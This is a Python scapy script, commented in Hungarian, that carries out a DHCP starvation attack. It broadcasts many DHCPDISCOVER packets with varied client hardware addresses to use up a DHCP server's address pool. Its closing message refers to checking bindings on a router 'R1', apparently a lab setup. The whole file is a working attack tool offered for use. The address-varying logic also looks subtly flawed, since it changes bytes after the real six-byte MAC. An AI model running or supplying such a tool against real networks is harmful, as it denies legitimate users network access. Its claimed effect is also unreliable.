#!/usr/bin/env python3
"""Kimeríti a DHCP-poolt egyedi ügyfél-MAC-okkal küldött DISCOVER-ekkel.

Futtatás: sudo python3 dhcp_starve.py eth0 250
"""
import random, struct, sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 250
    conf.iface = iface
    real_mac = conf.iface.mac
    print(f"[*] {n} DHCPDISCOVER különböző ügyfél-MAC-okkal...")
    for i in range(n):
        chaddr = (bytes.fromhex(real_mac.replace(":", "")) +
                  struct.pack(">IH", i, 0)).ljust(16, b"\x00")[:16]
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=real_mac) /
              IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
              BOOTP(chaddr=chaddr, xid=random.randint(1, 2**32 - 1), flags=0x8000) /
              DHCP(options=[("message-type", "discover"),
                            ("param_req_list", [1, 3, 6, 15, 51]), "end"]),
              verbose=0)
        if i % 25 == 0:
            print(f"[+] {i} DISCOVER elküldve")
    print("[!] Kész. Nézd: 'show ip dhcp binding' az R1-en.")

if __name__ == "__main__":
    main()
